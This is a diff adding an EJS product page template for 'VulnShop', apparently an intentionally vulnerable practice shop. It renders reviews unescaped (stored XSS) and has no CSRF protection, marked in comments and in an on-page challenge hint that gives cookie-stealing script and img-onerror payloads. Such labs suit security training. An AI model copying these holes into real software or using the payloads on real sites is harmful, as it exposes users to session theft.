@@ -1,0 +1,320 @@
+<%- include('../partials/header') %>
+
+<div class="product-detail-page">
+
+  <!-- Breadcrumb -->
+  <nav class="breadcrumb">
+    <a href="/">Home</a> › 
+    <a href="/products?category=<%= encodeURIComponent(product.category) %>"><%= product.category %></a> › 
+    <span><%= product.name.substring(0, 50) %><%= product.name.length > 50 ? '...' : '' %></span>
+  </nav>
+
+  <!-- Product Main -->
+  <div class="product-main">
+
+    <!-- Images -->
+    <div class="product-images">
+      <img src="<%= product.image_url %>" alt="<%= product.name %>" class="product-main-image"
+        onerror="this.src='https://picsum.photos/seed/<%= product.id %>p/600/500'">
+      <div class="image-thumbnails">
+        <% for(let i=0; i<4; i++) { %>
+          <img src="https://picsum.photos/seed/<%= product.id + '_' + i %>/100/80"
+            alt="View <%= i+1 %>" class="thumb-img">
+        <% } %>
+      </div>
+    </div>
+
+    <!-- Product Info -->
+    <div class="product-detail-info">
+      <span class="brand-tag"><%= product.seller %></span>
+      <h1 class="product-detail-title"><%= product.name %></h1>
+
+      <div class="product-rating-detail">
+        <% for(let i=1; i<=5; i++) { %>
+          <i class="fas fa-star <%= i <= Math.round(product.rating || 4) ? 'star-filled' : 'star-empty' %>"></i>
+        <% } %>
+        <a href="#reviews" class="review-link"><%= product.review_count %> ratings</a>
+        |
+        <span class="rank-badge">#1 Best Seller in <%= product.category %></span>
+      </div>
+
+      <div class="price-section">
+        <div class="deal-label">Deal of the Day</div>
+        <div class="price-main">
+          <span class="price-symbol">$</span>
+          <span class="price-integer"><%= Math.floor(product.price) %></span>
+          <span class="price-decimal">.<%= (product.price % 1).toFixed(2).substring(2) %></span>
+        </div>
+        <% if (product.original_price && product.original_price > product.price) { %>
+          <div class="price-was">
+            List Price: <s>$<%= parseFloat(product.original_price).toFixed(2) %></s>
+            <span class="savings">
+              You Save: $<%= (product.original_price - product.price).toFixed(2) %>
+              (<%= Math.round((1 - product.price / product.original_price) * 100) %>%)
+            </span>
+          </div>
+        <% } %>
+      </div>
+
+      <div class="product-description">
+        <p><%= product.description %></p>
+      </div>
+
+      <div class="product-stock-info">
+        <% if (product.stock > 10) { %>
+          <span class="in-stock-label">✓ In Stock</span>
+        <% } else if (product.stock > 0) { %>
+          <span class="low-stock-label">⚠️ Only <%= product.stock %> left in stock</span>
+        <% } else { %>
+          <span class="out-stock-label">✗ Out of Stock</span>
+        <% } %>
+      </div>
+
+      <div class="add-to-cart-section">
+        <div class="quantity-selector">
+          <label>Qty:</label>
+          <select id="quantity">
+            <% for(let i=1; i<=Math.min(10, product.stock); i++) { %>
+              <option value="<%= i %>"><%= i %></option>
+            <% } %>
+          </select>
+        </div>
+        <button class="btn-add-cart-large" id="addToCartBtn" onclick="addToCart(<%= product.id %>)">
+          <i class="fas fa-shopping-cart"></i> Add to Cart
+        </button>
+        <button class="btn-buy-now" onclick="buyNow(<%= product.id %>)">
+          Buy Now
+        </button>
+      </div>
+
+      <div class="product-meta-detail">
+        <table class="meta-table">
+          <tr><td>Category</td><td><%= product.category %></td></tr>
+          <tr><td>Sold by</td><td><%= product.seller %></td></tr>
+          <tr><td>In Stock</td><td><%= product.stock %> units</td></tr>
+          <tr><td>Product ID</td><td><%= product.id %></td></tr>
+        </table>
+      </div>
+
+      <div class="secure-transaction">
+        <i class="fas fa-lock"></i> Secure transaction | Free shipping on orders over $35
+      </div>
+    </div>
+
+    <!-- Buy Box -->
+    <div class="buy-box">
+      <div class="buy-box-price">$<%= parseFloat(product.price).toFixed(2) %></div>
+      <div class="buy-box-shipping">FREE delivery</div>
+      <div class="buy-box-delivery"><i class="fas fa-truck"></i> Arrives in 2-5 days</div>
+      <div class="buy-box-stock in-stock-label">In Stock</div>
+      <select class="buy-box-qty" id="buyQty">
+        <% for(let i=1; i<=Math.min(10,product.stock); i++) { %>
+          <option value="<%= i %>">Qty: <%= i %></option>
+        <% } %>
+      </select>
+      <button class="btn-full btn-amazon" style="margin-top:8px" onclick="addToCart(<%= product.id %>)">
+        Add to Cart
+      </button>
+      <button class="btn-full btn-secondary" onclick="buyNow(<%= product.id %>)">
+        Buy Now
+      </button>
+      <div class="buy-box-meta">Ships from and sold by <strong><%= product.seller %></strong></div>
+    </div>
+  </div>
+
+  <!-- Product Description -->
+  <div class="product-description-full">
+    <h2>About this item</h2>
+    <div class="description-content">
+      <ul>
+        <li><%= product.description %></li>
+        <li>Free returns within 30 days</li>
+        <li>Eligible for FREE Shipping on orders over $35</li>
+        <li>VulnShop's Choice in <%= product.category %></li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- Reviews Section -->
+  <div class="reviews-section" id="reviews">
+    <h2>Customer Reviews</h2>
+
+    <div class="review-summary">
+      <div class="overall-rating">
+        <div class="big-rating"><%= parseFloat(product.rating || 4).toFixed(1) %></div>
+        <div>
+          <% for(let i=1; i<=5; i++) { %>
+            <i class="fas fa-star <%= i <= Math.round(product.rating || 4) ? 'star-filled' : 'star-empty' %>"></i>
+          <% } %>
+          <div style="font-size:12px;color:#565959">out of 5</div>
+        </div>
+      </div>
+      <div class="rating-bars">
+        <% [5,4,3,2,1].forEach(star => { %>
+          <div class="rating-bar-row">
+            <span><%= star %> star</span>
+            <div class="rating-bar"><div class="rating-bar-fill" style="width:<%= star === 5 ? '65' : star === 4 ? '20' : star === 3 ? '10' : '5' %>%"></div></div>
+            <span><%= star === 5 ? '65' : star === 4 ? '20' : star === 3 ? '10' : '5' %>%</span>
+          </div>
+        <% }) %>
+      </div>
+    </div>
+
+    <% if (req && req.query && req.query.reviewPosted) { %>
+      <div class="alert alert-success">✅ Your review has been posted!</div>
+    <% } %>
+
+    <!-- Review List -->
+    <!-- VULNERABILITY: Reviews rendered with <%- (unescaped) - Stored XSS delivery point -->
+    <!-- Any script injected via review submission will execute here for ALL users -->
+    <div class="review-list">
+      <% if (reviews.length === 0) { %>
+        <p class="no-reviews">No reviews yet. Be the first to review this product!</p>
+      <% } else { %>
+        <% reviews.forEach(review => { %>
+        <div class="review-item">
+          <div class="review-header">
+            <div class="reviewer-avatar">
+              <%= review.username ? review.username[0].toUpperCase() : 'U' %>
+            </div>
+            <div class="reviewer-info">
+              <strong><%= review.username || 'Anonymous' %></strong>
+              <div class="review-stars">
+                <% for(let i=1; i<=5; i++) { %>
+                  <i class="fas fa-star <%= i <= review.rating ? 'star-filled' : 'star-empty' %>" style="font-size:12px"></i>
+                <% } %>
+              </div>
+            </div>
+            <div class="review-date">
+              <%= new Date(review.created_at).toLocaleDateString('en-US', {year:'numeric',month:'long',day:'numeric'}) %>
+            </div>
+          </div>
+          <% if (review.title) { %>
+            <h4 class="review-title"><strong><%- review.title %></strong></h4>
+          <% } %>
+          <!-- VULNERABILITY: Content rendered unescaped (<%- vs <%=) -->
+          <!-- Stored XSS: submit <script>fetch('/api/steal?c='+document.cookie)</script> as review -->
+          <div class="review-content"><%- review.content %></div>
+          <div class="review-helpful">
+            <span>Helpful?</span>
+            <button class="helpful-btn"><i class="fas fa-thumbs-up"></i> Yes (<%= review.helpful_count || 0 %>)</button>
+            <button class="helpful-btn"><i class="fas fa-thumbs-down"></i> No</button>
+          </div>
+        </div>
+        <% }) %>
+      <% } %>
+    </div>
+
+    <!-- Write a Review Form -->
+    <div class="write-review">
+      <h3>Write a Customer Review</h3>
+      <% if (user) { %>
+        <!-- VULNERABILITY: No CSRF protection on review form -->
+        <form action="/products/<%= product.id %>/review" method="POST" class="review-form">
+          <div class="form-group">
+            <label>Overall rating <span class="required">*</span></label>
+            <div class="star-select" id="starSelect">
+              <% for(let i=1; i<=5; i++) { %>
+                <i class="fas fa-star star-pick" data-val="<%= i %>"></i>
+              <% } %>
+            </div>
+            <input type="hidden" name="rating" id="ratingInput" value="5">
+          </div>
+          <div class="form-group">
+            <label>Add a headline</label>
+            <input type="text" name="title" class="form-input" placeholder="What's most important to know?">
+          </div>
+          <div class="form-group">
+            <label>Add a written review</label>
+            <!-- VULNERABILITY: No XSS sanitization on content field -->
+            <!-- Try: <script>fetch('/api/steal?c='+document.cookie)</script> -->
+            <!-- Try: <img src=x onerror="alert('XSS: '+document.cookie)"> -->
+            <textarea name="content" class="form-input" rows="5"
+              placeholder="What did you like or dislike? What did you use this product for?"></textarea>
+          </div>
+          <div class="xss-hint">
+            💡 <strong>Challenge Hint:</strong> Review content is stored without sanitization.
+            Try: <code>&lt;script&gt;fetch('/api/steal?c='+document.cookie)&lt;/script&gt;</code>
+            or <code>&lt;img src=x onerror="fetch('/api/xss-flag?src=review')"&gt;</code>
+          </div>
+          <button type="submit" class="btn-amazon">Submit Review</button>
+        </form>
+      <% } else { %>
+        <div class="login-to-review">
+          <i class="fas fa-lock"></i>
+          <a href="/auth/login">Sign in</a> to write a review.
+        </div>
+      <% } %>
+    </div>
+  </div>
+
+  <!-- Related Products -->
+  <% if (related && related.length > 0) { %>
+  <div class="related-products">
+    <h2>Customers also viewed</h2>
+    <div class="related-grid">
+      <% related.forEach(p => { %>
+      <div class="product-card">
+        <a href="/products/<%= p.id %>">
+          <img src="<%= p.image_url %>" alt="<%= p.name %>"
+            onerror="this.src='https://picsum.photos/seed/<%= p.id %>r/400/300'">
+          <div class="product-info">
+            <div class="product-title" style="font-size:13px"><%= p.name.substring(0,60) %></div>
+            <div class="current-price">$<%= parseFloat(p.price).toFixed(2) %></div>
+          </div>
+        </a>
+        <button class="btn-add-cart" onclick="addToCart(<%= p.id %>, this)">Add to Cart</button>
+      </div>
+      <% }) %>
+    </div>
+  </div>
+  <% } %>
+
+</div>
+
+<script>
+// Star rating picker
+document.querySelectorAll('.star-pick').forEach(star => {
+  star.addEventListener('click', function() {
+    const val = parseInt(this.dataset.val);
+    document.getElementById('ratingInput').value = val;
+    document.querySelectorAll('.star-pick').forEach((s, i) => {
+      s.style.color = i < val ? '#FF9900' : '#ccc';
+    });
+  });
+});
+
+function addToCart(productId, btn) {
+  const qty = document.getElementById('buyQty')?.value || document.getElementById('quantity')?.value || 1;
+  const button = btn || document.getElementById('addToCartBtn');
+  if (button) { button.disabled = true; button.textContent = 'Adding...'; }
+  
+  fetch('/cart/add', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: `product_id=${productId}&quantity=${qty}`
+  })
+  .then(r => r.json())
+  .then(data => {
+    if (data.success) {
+      if (button) { button.textContent = '✓ Added to Cart!'; button.style.background = '#067D62'; }
+      updateCartCount();
+      setTimeout(() => {
+        if (button) { button.disabled = false; button.textContent = 'Add to Cart'; button.style.background = ''; }
+      }, 2000);
+    } else {
+      window.location.href = '/auth/login';
+    }
+  });
+}
+
+function buyNow(productId) {
+  fetch('/cart/add', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: `product_id=${productId}&quantity=1`
+  }).then(() => window.location.href = '/cart/checkout');
+}
+</script>
+
+<%- include('../partials/footer') %>
